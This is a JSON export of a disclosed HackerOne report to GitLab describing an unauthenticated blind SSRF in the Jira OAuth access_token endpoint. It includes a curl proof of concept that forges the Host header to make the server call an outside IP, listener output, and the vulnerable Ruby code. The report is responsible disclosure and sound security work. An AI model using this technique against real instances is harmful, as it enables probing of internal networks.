{
  "id": 398799,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTg3OTk=",
  "url": "https://hackerone.com/reports/398799",
  "title": "Unauthenticated blind SSRF in OAuth Jira authorization controller",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2018-08-24T03:05:22.400Z",
  "submitted_at": "2018-08-24T03:05:22.400Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jobert",
    "url": "/jobert",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-03-14T16:28:39.097Z",
  "bug_reporter_agreed_on_going_public_at": "2019-02-12T16:28:38.692Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The `Oauth::Jira::AuthorizationsController#access_token` endpoint is vulnerable to a blind SSRF vulnerability. The vulnerability allows an attacker to make arbitrary HTTP/HTTPS requests inside a GitLab instance's network.\n\n# Proof of concept\nTo reproduce the vulnerability, follow the steps below.\n\n - spin up a GitLab EE instance with the latest version (11.2.1-ee)\n - send a `POST` request to the `/-/jira/login/oauth/callback` endpoint, as shown below. In the request, point the `Host` header to the hostname / IP address and port number you want to send the request to:\n\n```\ncurl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'\n```\n\n - Observe a `POST` request being sent to `162.243.147.21:81` (in this case HTTPS):\n\n```\nListening on [0.0.0.0] (family 0, port 81)\nConnection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)\n��ؒ����\n��/$����4�i�,�֟J%>�+�/�,�0�����#�'�\t��$�(�\n�gk39@j28��<=/5�l162.243.147.21\n\n Connection closed, listening again.\n```\n\n# Vulnerable code\nThe following code can be found in the `Oauth::Jira::AuthorizationsController#access_token` method.\n\n```ruby\ndef access_token\n  auth_params = params\n                  .slice(:code, :client_id, :client_secret)\n                  .merge(grant_type: 'authorization_code', redirect_uri: oauth_jira_callback_url)\n\n  auth_response = Gitlab::HTTP.post(oauth_token_url, body: auth_params, allow_local_requests: true)\n  token_type, scope, token = auth_response['token_type'], auth_response['scope'], auth_response['access_token']\n\n  render text: \"access_token=#{token}&scope=#{scope}&token_type=#{token_type}\"\nend\n```\n\nThe `GItlab::HTTP.post` call is using the `oauth_token_url` directly. This `_url` Rails routing helper uses the `Host` header to construct the URL it needs to point to. Because every host is accepted in GitLab, the constructed URL can point to an internal system. This is how it's supposed to work. However, the `Host` header should be checked before making the `post` call to avoid an attacker being able to make arbitrary requests.\n\n## Impact\n\nThe response of the server is actually interpreted, but this is limited to a JSON response that returns an `access_token`, `scope`, and `token_type`. However, this may have additional consequences in case there are unauthenticated endpoints within the instance's network. This isn't very likely, which is why the attack complexity is set to High. It has a minor impact on Availability, because a thread is blocked on the TCP read timeout, which is set to 60 seconds (`curl -X POST -H 'Host: 162.243.147.21:81'   0.03s user 0.01s system 0% cpu 1:00.76 total`). The integrity impact is currently set at High, but this depends on additional factors, such as what other internal services can be hit. The user does not need to be authenticated to execute the call.",
  "bounty_amount": "4000.0",
  "formatted_bounty": "$4,000",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-03-14T16:28:38.859Z",
  "allow_singular_disclosure_after": -155248875.12139505,
  "singular_disclosure_allowed": true,
  "vote_count": 222,
  "voters": [
    "notpwnguy",
    "p1stachios",
    "sklnhunt",
    "badcracker",
    "mashoud1122",
    "0xbeefed",
    "base_64",
    "sameerphad72",
    "e4366eolywrgpidfbio",
    "spam404",
    "and 212 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.5,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "none",
      "integrity": "high",
      "availability": "low"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
